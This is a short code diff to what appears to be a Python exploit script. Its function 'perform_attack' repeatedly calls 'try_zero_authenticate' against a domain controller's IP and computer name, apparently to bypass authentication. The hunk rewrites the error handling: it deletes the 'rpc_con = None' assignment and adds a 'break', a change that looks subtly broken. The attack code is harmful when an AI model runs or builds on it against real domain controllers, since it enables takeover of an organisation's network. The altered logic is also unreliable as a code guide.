@@ -72,9 +72,9 @@ def perform_attack(dc_handle, dc_ip, target_computer):
         try:
             rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)
         except BaseException as ex:
-            rpc_con = None
+            
             fail(f'Unexpected error: {ex}.')
-
+            break
         if rpc_con == None:
             print('=', end='', flush=True)
         else:
